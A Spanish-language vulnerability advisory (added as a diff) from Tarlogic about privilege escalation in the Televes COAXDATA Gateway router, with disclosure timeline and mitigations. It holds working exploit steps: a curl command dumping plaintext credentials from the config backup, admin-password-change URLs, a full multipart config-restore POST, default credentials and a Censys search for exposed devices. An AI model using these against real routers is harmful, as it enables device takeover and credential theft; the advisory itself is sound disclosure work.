@@ -1,0 +1,179 @@
+          ===============================
+                   - Advisory -
+          ===============================
+
+  Titulo:   Televes COAXDATA GATEWAY 1Gbps (Ref: 769301) - Escalada de privilegios
+  Riesgo:   Alto
+   Fecha:   19.Jul.2017
+   Autor:   Pedro Andujar (Tarlogic)
+ Twitter:   @pandujar
+
+            	
+.: [ INTRO ] :.
+
+Televes COAXDATA GATEWAY 1Gbps es un dispositivo router+WiFI con la particularidad de utilizar la toma
+de televisión para proveer de conexión a internet. Según indica el propio fabricante:
+
+"El Data Over Coax Gateway permite transmitir datos IP sobre instalaciones de cable coaxial y la
+coexistencia de canales de TV u otros servicios existentes. Tambien incorpora una interfaz WiFi 802.11bgn
+para conexiones inalambricas permitiendo el acceso a la red cualquier dispositivo inalámbrico.
+
+El Router Ethernet-Coaxial-Wifi permite conectar inmediatamente múltiples PCs sobre la red coaxial o
+eléctrica de su vivienda, hotel o edificios sin necesidad de cables extras, ni de Hubs, ni Switches Ethernet."
+
+Este dispositivo es ampliamente utilizado por proveedores de WiMAX, Internet Rural, etc... en mayor número en España, 
+Austria y Portugal.
+
+
+.: [ DESCRIPCION TECNICA ] :.
+
+Televes COAXDATA gateway contiene por defecto dos usuarios principales (Admin) para gestionar el dispositivo mediante 
+web o ssh y otro restringido (username) que tiene acceso web a funciones más básicas (únicamente red local y WiFi).
+
+Se han identificado diversas formas que permiten que el usuario restringido pueda adquirir o modificar la contraseña de 
+administrador, obteniendo por tanto acceso al resto de credenciales del dispositivo y pudiendo además acceder como root al sistema 
+operativo BusyBox, desde donde poder tomar el control total del mismo.
+
+Se ha podido comprobar que un gran múmero de estos dispositivos expuestos en internet, protegen únicamente la cuenta de administrador
+dejando por defecto la cuenta restringida (username / 123456), lo que permite mediante este fallo hacerse con el control de los mismos, 
+y permitiendo acceder a otros dispositivos existentes en la red interna.
+
+https://www.censys.io/ipv4?q=Televes+CoaxData+Wifi
+
+Ref.769301 CoaxData 1Gbps-HDTV Coax+Wifi
+Versión: doc-wifi-hgw_v1.02.0014 2016-02-02-14:01 - CD Firmware Version 4.20
+
+
+.: [ ISSUE #1 ]:.
+
+Nombre: Backup con credenciales en claro accesible por usuario restringido
+Riesgo: Alto
+CVE: CVE-2017-6532
+
+Esta vulnerabilidad son realmente dos, por un lado la falta de cifrado al almacenar las credenciales en el fichero de configuración,
+por otro lado la falta de control de acceso al fichero de backup por el usuario restringido. De esta forma tras acceder con las credenciales
+por defecto solo habrá que acceder a la URL que se muestra más abajo, donde aparecerán en claro los usuarios y contraseñas de WiFI, pin WPS, 
+WAN (proveedor de internet) y del propio dispositivo incluyendo la del usuario Admin:
+
+pandujar@fogheaven:~$ curl http://192.168.2.1/mib.db | grep -i Password
+
+InternetGatewayDevice.DeviceInfo.X_ATH-COM_TeleComAccount.Password -m 1 -d Changeme1 (Admin password)
+InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Password -m 1 -d Changeme2 (ISP Password)
+InternetGatewayDevice.X_ATH-COM_Account.UserPassword -m 1 -d 123456 (username password)
+
+
+.: [ ISSUE #2 ]:.
+
+Nombre: Cambio de contraseña arbitrario
+Riesgo: Alto
+CVE: CVE-2017-6530
+
+Se trata de nuevo de insuficiente control de acceso y controles en la parte del cliente. Una vez logeados como el usuario restringido, podemos 
+modificar la contraseña del usuario Admin de la siguiente forma:
+
+http://192.168.2.1/password.shtml?DeviceInfo.X_ATH-COM_TeleComAccount.Password=hax0rcito
+
+De hecho, el formulario de cambio de password, permite en realidad modificar cualquier propiedad de la configuración, por ejemplo también 
+permitiría habilitar SNMP:
+
+http://192.168.2.1/password.shtml?DoCSnmpAgent.Enable=1
+
+
+.: [ ISSUE #3 ]:.
+
+Nombre: Restaurar backup de configuración
+Riesgo: Alto
+CVE: CVE-2017-6531
+
+La función de restaurar backup y reinicio del dispositivo, vuelven a carecer de control de acceso, por tanto el usuario restringido puede
+modificar la configuración estableciendo las credenciales de su elección. Ej:
+
+POST /ReadFile.cgi HTTP/1.1
+Host: 192.168.2.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://192.168.2.1/resetrouter.shtml?DeviceInfo.AdditionalConfigVersion=default_cfg_v1.02.0014
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=---------------------------66789582480853432558488077
+Content-Length: 42533
+
+-----------------------------66789582480853432558488077
+Content-Disposition: form-data; name="cfgfile"; filename="s"
+Content-Type: application/octet-stream
+
+InternetGatewayDevice.DeviceInfo.X_ATH-COM_TeleComAccount.Password -m 1 -d !dSR4ever
+
+
+-----------------------------66789582480853432558488077
+Content-Disposition: form-data; name="LoadCfgFile"
+
+Load
+-----------------------------66789582480853432558488077--
+
+Accediendo posteriormente a:
+
+http://192.168.2.1/result.shtml?method=LoadCfgFile&result=0&cfgfile=/tmp/s1488261988
+
+Y por último reiniciando el dispositivo 
+
+http://192.168.2.1/result.shtml?method=Reboot
+
+
+.: [ ISSUE #4 ]:.
+
+Nombre: Credenciales enviadas por querystring
+Riesgo: Bajo
+
+Tanto al hacer login como al cambiar de contraseña, las credenciales se pasan por GET (querystring), por tanto quedan cacheadas en el historial
+de navegación, haciendo que puedan ser reveladas accidentalmente.
+
+http://192.168.2.1/login?username=Admin&password=XXxXXXXxxX
+
+
+.: [ ISSUE #5 ]:.
+
+Nombre: Mecanismo de sesión débil, basada en ip origen
+Riesgo: Medio
+CVE: N/A
+
+Tras realizar el proceso de autenticación no se asigna ningún token o cookie al navegador cliente, sino que el servidor reconocerá al usuario en base
+a su dirección ip origen. Este mecanismo permite que si un usuario se autentica a través de internet, cualquiera que comparta su ip de navegación tenga 
+acceso al dispositivo con la cuenta que se autenticó.
+
+
+.: [ ACCIONES ] :.
+
+  * 19/Feb/2017:   - Vulnerabilidades identificadas.
+  * 27/Feb/2017:   - Fabricante contactado, desde el formulario web.
+  * 28/Feb/2017:   - Envío de detalles técnicos en un segundo intento de contacto. 
+  * 01/Mar/2017:   - Respuesta confirmando el problema e indicando que las próximas versiones no incluirán el usuario restringido.
+  * 13/Jul/2017:   - Email de seguimiento de resolución. Sin respuesta.
+  * 20/Jul/2017:   - Información publicada.
+
+
+.: [ SOLUCIONES ] :.
+
+Se recomienda como medida preventiva cambiar el nombre de usuario y contraseña del usuario restringido que viene por defecto, además de 
+bloquear la publicación del interfaz de administración y SSH en internet o redes no confiables.
+
+
+.: [ REFERENCIAS ] :.
+
+   [+] COAXDATA GATEWAY 1Gbps
+    http://www.televes.es/es/producto/coaxdata-gateway-1gbps
+
+   [+] Televes About US
+    http://www.televes.es/es/empresa/quienes
+
+   [+] Tarlogic Security S.L.
+    http://www.tarlogic.com/
+
+   
+
+
+
+
+                    -=EOF=-
+
